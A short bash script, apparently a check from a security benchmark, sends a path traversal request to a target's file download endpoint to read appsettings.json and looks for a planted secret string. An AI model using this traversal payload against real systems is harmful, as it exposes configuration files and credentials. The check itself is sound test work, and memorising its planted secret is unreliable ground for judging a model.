#!/usr/bin/env bash
set -e; . "$(dirname "$0")/_lib.sh"
curl -s "$TARGET/api/files/download?name=../../../app/appsettings.json" | grep -q 'BenchPlaintextSecret-aspnet-123'
